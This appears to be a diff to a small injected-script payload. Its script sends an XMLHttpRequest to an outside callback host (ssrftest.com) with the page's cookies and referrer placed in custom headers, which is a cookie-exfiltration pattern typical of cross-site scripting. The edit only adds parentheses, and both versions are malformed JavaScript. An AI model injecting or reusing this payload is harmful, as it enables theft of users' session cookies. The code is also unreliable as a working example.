@@ -5,8 +5,8 @@
 <script>
 var xhr= new XMLHttpRequest();
     xhr.open('GET', 'https://ssrftest.com/x/hCZ8o');
-    xhr.setRequestHeader('CustomHeader1',javascript:document.referer)
-    xhr.setRequestHeader('CustomHeader2',javascript:document.cookie)
+    xhr.setRequestHeader('CustomHeader1',(javascript:document.referer))
+    xhr.setRequestHeader('CustomHeader2',(javascript:document.cookie))
     xhr.send();
     xhr.onreadystatechange= function() {
         if (this.readyState!==4) return;
